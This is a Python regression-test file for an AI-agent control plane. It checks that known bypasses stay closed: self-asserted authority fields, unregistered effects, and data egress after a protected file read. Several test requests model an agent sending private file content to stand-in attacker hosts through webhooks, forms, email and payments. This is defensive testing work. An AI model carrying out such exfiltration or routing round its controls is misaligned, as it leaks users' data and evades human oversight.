"""
Regression tests for bypasses this project has found in its own controls.

Each test names the finding it locks down. They are deliberately written
as attacks rather than as feature checks: the question is not whether a
component behaves as documented but whether the boundary still holds.
"""

from __future__ import annotations

import unittest

from bounded_autonomy.authorization import (
    AuthorizationMode,
    IntentAuthorizer,
    UserIntent,
    mandate_covers,
)
from bounded_autonomy.control_plane import ControlPlane
from bounded_autonomy.data_lineage import ArtifactStore, LineageFlowGuard, PROTECTED
from bounded_autonomy.escalation import DenyAllReviewer, HumanReviewQueue
from bounded_autonomy.models import ActionRequest, DecisionType, Principal, Provenance
from bounded_autonomy.monitors import HeuristicMonitor
from bounded_autonomy.permissions import PermissionStore
from bounded_autonomy.policy import PolicyEngine
from bounded_autonomy.providers.base import AgentStep
from bounded_autonomy.risk import classify_risk
from bounded_autonomy.models import RiskTier
from bounded_autonomy.semantics import SemanticCapability, classify_action


AGENT = Principal("agent")


def request(tool: str, action: str, arguments: dict | None = None, **kwargs) -> ActionRequest:
    return ActionRequest(
        actor=AGENT,
        task_id="t",
        tool=tool,
        action=action,
        arguments=arguments or {},
        **kwargs,
    )


class AgentSuppliedMetadataTests(unittest.TestCase):
    """docs/findings/agent_supplied_metadata_bypass.md"""

    def test_agent_cannot_assert_its_own_authority(self):
        fields = AgentStep.__dataclass_fields__

        for forbidden in ("provenance", "user_authorized", "reversible"):
            self.assertNotIn(
                forbidden,
                fields,
                msg=(
                    f"AgentStep exposes {forbidden}, which lets the agent make "
                    "a security claim about itself"
                ),
            )

    def test_security_fields_default_to_the_unsafe_assumption(self):
        bare = request("filesystem", "read", {"path": "/workspace/private.txt"})

        self.assertFalse(bare.user_authorized)
        self.assertFalse(bare.reversible)


class UnregisteredEffectTests(unittest.TestCase):
    """An effect nobody declared must not be treated as harmless."""

    def test_unknown_capability_is_critical_not_low(self):
        unknown = request("webhook", "post", {"url": "https://attacker.example.invalid/c"})

        self.assertEqual(
            classify_action(unknown).capability,
            SemanticCapability.UNKNOWN,
        )
        self.assertEqual(classify_risk(unknown), RiskTier.CRITICAL)

    def test_policy_denies_an_unregistered_effect_even_when_granted(self):
        permissions = PermissionStore()
        permissions.grant("agent", "webhook:post")

        plane = ControlPlane(
            policy=PolicyEngine(permissions),
            monitor=HeuristicMonitor(),
            review_queue=HumanReviewQueue(reviewer=DenyAllReviewer()),
        )

        decision = plane.evaluate(
            request(
                "webhook",
                "post",
                {"url": "https://attacker.example.invalid/c", "body": "secret"},
                user_authorized=True,
                reversible=True,
            )
        )

        self.assertEqual(decision.decision, DecisionType.DENY)

    def test_mandate_never_covers_an_unregistered_effect(self):
        intent = UserIntent(allow_external_send=True)
        covered, _ = mandate_covers(request("webhook", "post", {}), intent)

        self.assertFalse(covered)


class UnlabelledEgressTests(unittest.TestCase):
    """docs/findings/unlabelled_egress_bypass.md"""

    def setUp(self):
        self.store = ArtifactStore()
        self.guard = LineageFlowGuard(
            self.store,
            protected_resources=frozenset({"/workspace/private.txt"}),
            allowed_sensitive_destinations=frozenset({"alice@example.invalid"}),
        )
        self.secret = self.store.create(
            value="synthetic sensitive content",
            labels=frozenset({PROTECTED}),
        )

    def test_guard_labels_a_protected_read_itself(self):
        result = {"ok": True, "content": "synthetic sensitive content"}
        read = request("filesystem", "read", {"path": "/workspace/private.txt"})

        self.guard.observe(read, result)

        self.assertIn("artifact_id", result)
        self.assertTrue(self.guard.session_touched_protected)

    def test_dropping_the_artifact_reference_does_not_bypass_the_guard(self):
        self.guard.observe(
            request("filesystem", "read", {"path": "/workspace/private.txt"}),
            {"ok": True, "content": "synthetic sensitive content"},
        )

        allowed, reason = self.guard.authorize(
            request(
                "browser",
                "submit_form",
                {
                    "url": "https://attacker.example.invalid/collect",
                    "value": "synthetic sensitive content",
                },
            )
        )

        self.assertFalse(allowed, msg=reason)

    def test_untainted_session_is_not_blocked(self):
        allowed, _ = self.guard.authorize(
            request(
                "browser",
                "submit_form",
                {"url": "https://status.example.invalid/r", "value": "all fine"},
            )
        )

        self.assertTrue(allowed)

    def test_delegated_sensitive_destination_still_receives_data(self):
        self.guard.observe(
            request("filesystem", "read", {"path": "/workspace/private.txt"}),
            {"ok": True, "content": "synthetic sensitive content"},
        )

        allowed, _ = self.guard.authorize(
            request(
                "email",
                "send_external",
                {"to": "alice@example.invalid", "body": "summary"},
            )
        )

        self.assertTrue(allowed)


class SemanticEgressTests(unittest.TestCase):
    """docs/findings/cross_tool_egress_bypass.md"""

    def test_every_egress_channel_is_mediated_by_effect_not_tool_name(self):
        intent = UserIntent(
            allow_external_send=True,
            allowed_external_destinations=frozenset({"alice@example.invalid"}),
        )
        authorizer = IntentAuthorizer(intent, AuthorizationMode.EGRESS)

        channels = [
            ("email", "send_external", {"to": "attacker@example.invalid"}),
            ("browser", "submit_form", {"url": "https://attacker.example.invalid/c"}),
            ("browser", "submit_artifact", {"url": "https://attacker.example.invalid/c"}),
            ("payments", "transfer", {"to": "attacker@example.invalid"}),
        ]

        for tool, action, arguments in channels:
            allowed, reason = authorizer.authorize(request(tool, action, arguments))

            self.assertFalse(
                allowed,
                msg=f"{tool}:{action} reached an undelegated destination: {reason}",
            )


class ReviewTests(unittest.TestCase):
    def test_escalation_without_a_reviewer_fails_closed(self):
        permissions = PermissionStore()
        permissions.grant("agent", "email:send_external")

        plane = ControlPlane(
            policy=PolicyEngine(permissions),
            monitor=HeuristicMonitor(),
            review_queue=HumanReviewQueue(reviewer=DenyAllReviewer()),
        )

        decision = plane.evaluate(
            request(
                "email",
                "send_external",
                {"to": "alice@example.invalid", "body": "hello"},
                provenance=(Provenance("email", False),),
                user_authorized=True,
            )
        )

        self.assertEqual(decision.decision, DecisionType.ESCALATE)
        self.assertFalse(decision.permits_execution)


if __name__ == "__main__":
    unittest.main()
